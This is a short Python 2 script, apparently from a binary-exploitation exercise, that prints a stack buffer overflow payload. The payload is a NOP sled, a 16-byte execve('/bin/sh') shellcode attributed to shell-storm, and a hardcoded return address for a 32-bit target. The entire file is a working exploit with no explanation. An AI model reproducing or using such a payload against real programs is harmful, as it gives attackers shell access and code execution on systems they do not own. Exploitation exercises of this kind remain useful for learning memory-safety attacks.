#!/usr/bin/python

# execve("/bin/sh", ["/bin/sh"], NULL) - 16 bytes
# https://shell-storm.org/shellcode/files/shellcode-218.html

# little-endian
addr = "\x68\xf6\xff\xbf"
nopsled = "\x90" * 124
shellcode = "\x31\xc0\xbb\x58\xcc\xf8\xb7\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

print nopsled + shellcode + addr